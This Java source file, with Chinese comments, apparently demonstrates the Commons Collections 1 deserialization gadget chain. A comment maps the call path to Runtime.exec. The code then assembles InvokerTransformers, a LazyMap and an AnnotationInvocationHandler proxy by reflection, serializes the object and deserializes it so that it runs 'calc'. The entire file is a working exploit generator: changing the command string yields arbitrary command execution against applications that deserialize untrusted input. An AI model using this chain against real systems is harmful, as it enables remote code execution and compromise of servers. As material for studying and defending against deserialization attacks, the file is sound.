/**
 * 调用链
 * ObjectInputStream.readObject()
 *             AnnotationInvocationHandler.readObject()
 *                 Map(Proxy).entrySet()
 *                     AnnotationInvocationHandler.invoke()
 *                         LazyMap.get()
 *                             ChainedTransformer.transform()
 *                                 ConstantTransformer.transform()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Class.getMethod()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Runtime.getRuntime()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Runtime.exec()
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class CC1 {

    public static void main(String[] args)throws Exception {
        //创建 ChainedTransformer实例
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class },
                new String[] { "calc" }),
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        //创建 LazyMap 实例
        HashMap innermap = new HashMap();
        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor constructor = clazz.getDeclaredConstructor(Map.class, Transformer.class);
        constructor.setAccessible(true);
        Map lazymap = (Map)constructor.newInstance(innermap,chain);

        //创建一个Map的动态代理，handler为AnnotationInvocationHandler（属性memberValues为lazymap实例）

        clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotation = (InvocationHandler) constructor.newInstance(Override.class,lazymap);
        Map map_proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},annotation);

        //创建readObject入口类的实例
        InvocationHandler annotation_in = (InvocationHandler) constructor.newInstance(Override.class,map_proxy);

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(annotation_in);
        oos.close();
        System.out.println(baor);

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}